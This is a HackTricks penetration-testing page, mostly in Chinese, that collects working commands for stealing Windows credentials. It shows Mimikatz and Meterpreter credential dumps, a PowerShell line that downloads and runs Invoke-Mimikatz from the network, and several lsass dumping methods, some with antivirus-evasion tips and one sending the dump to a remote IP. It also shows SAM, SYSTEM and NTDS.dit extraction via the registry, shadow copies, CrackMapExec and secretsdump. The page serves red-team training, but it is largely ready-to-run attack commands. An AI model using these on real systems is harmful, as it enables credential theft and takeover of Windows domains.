# Stealing Windows Credentials

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在** [**此页面**](credentials-mimikatz.md)**中查找Mimikatz可以做的其他事情。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在这里了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护措施可以防止 Mimikatz 提取某些凭据。**

## 使用 Meterpreter 的凭据

使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **在受害者内部搜索密码和哈希。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一个合法的 Microsoft 工具**，它不会被 Defender 检测到。\
您可以使用此工具来 **转储 lsass 进程**，**下载转储**并 **从转储中提取** **凭据**。 

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="从转储中提取凭据" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe 和 "lsass.exe"**。因此，将 **lsass.exe 的 PID** 作为参数传递给 procdump **而不是** **lsass.exe 的名称** 更加 **隐蔽**。

### 使用 **comsvcs.dll** 转储 lsass

名为 **comsvcs.dll** 的 DLL 位于 `C:\Windows\System32`，负责在崩溃事件中 **转储进程内存**。此 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，旨在通过 `rundll32.exe` 调用。\
使用前两个参数是无关紧要的，但第三个参数分为三个部分。要转储的进程 ID 是第一部分，转储文件位置是第二部分，第三部分严格是单词 **full**。没有其他选项。\
解析这三个部分后，DLL 开始创建转储文件并将指定进程的内存转移到该文件中。\
利用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细信息可在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中找到。

执行时使用以下命令：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**自动化此过程。**

### **使用任务管理器转储 lsass**

1. 右键单击任务栏，然后单击任务管理器
2. 单击更多详细信息
3. 在进程选项卡中搜索“本地安全授权进程”
4. 右键单击“本地安全授权进程”，然后单击“创建转储文件”。

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持对内存转储进行混淆，并在不将其写入磁盘的情况下将其传输到远程工作站。

**主要功能**：

1. 绕过 PPL 保护
2. 混淆内存转储文件以规避 Defender 基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传内存转储，而不将其写入磁盘（无文件转储）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### 转储 SAM 哈希
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA 秘密
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 转储 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 转储 NTDS.dit 密码历史记录
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 账户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

这些文件应该**位于**_C:\windows\system32\config\SAM_和_C:\windows\system32\config\SYSTEM._ 但是**你不能以常规方式复制它们**，因为它们受到保护。

### From Registry

窃取这些文件的最简单方法是从注册表获取副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的Kali机器，并使用以下命令**提取哈希**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影复制

您可以使用此服务复制受保护的文件。您需要是管理员。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你可以通过 **Powershell** 做同样的事情。这是 **如何复制 SAM 文件** 的一个例子（使用的硬盘是 "C:"，并保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最后，您还可以使用 [**PS 脚本 Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 凭据 - NTDS.dit**

**NTDS.dit** 文件被称为 **Active Directory** 的核心，保存有关用户对象、组及其成员资格的重要数据。它是存储域用户的 **密码哈希** 的地方。该文件是一个 **可扩展存储引擎 (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

在这个数据库中，维护着三个主要表：

- **数据表**：该表负责存储有关用户和组等对象的详细信息。
- **链接表**：它跟踪关系，例如组成员资格。
- **SD 表**：每个对象的 **安全描述符** 存放在这里，确保存储对象的安全性和访问控制。

更多信息请访问：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows 使用 _Ntdsa.dll_ 与该文件进行交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高了性能）。

#### 解密 NTDS.dit 中的哈希

哈希被加密三次：

1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥 (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密 **哈希**。
3. 使用 **DES** 解密 **哈希**。

**PEK** 在 **每个域控制器** 中具有 **相同的值**，但它在 **NTDS.dit** 文件中使用 **域控制器的 SYSTEM 文件的 BOOTKEY** 进行 **加密**（在不同的域控制器之间是不同的）。这就是为什么要从 NTDS.dit 文件中获取凭据 **您需要 NTDS.dit 和 SYSTEM 文件** (_C:\Windows\System32\config\SYSTEM_)。

### 使用 Ntdsutil 复制 NTDS.dit

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
您还可以使用 [**卷影复制**](./#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要一份 **SYSTEM 文件**（同样，您可以 [**从注册表转储或使用卷影复制**](./#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 中提取哈希**

一旦您 **获得** 了 **NTDS.dit** 和 **SYSTEM** 文件，您可以使用像 _secretsdump.py_ 这样的工具来 **提取哈希**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
您还可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于 **大 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 提取它。

最后，您还可以使用 **metasploit 模块**：_post/windows/gather/credentials/domain\_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`

### **从 NTDS.dit 提取域对象到 SQLite 数据库**

NTDS 对象可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 提取到 SQLite 数据库中。不仅提取了秘密，还提取了整个对象及其属性，以便在原始 NTDS.dit 文件已被检索时进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取以下数据：用户和机器账户及其哈希、UAC 标志、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...

## Lazagne

从 [这里](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
```
lazagne.exe all
```
## 从SAM和LSASS提取凭据的其他工具

### Windows凭据编辑器 (WCE)

此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从：[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) 下载并**执行它**，密码将被提取。

## 防御

[**在这里了解一些凭证保护。**](credentials-protections.md)

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
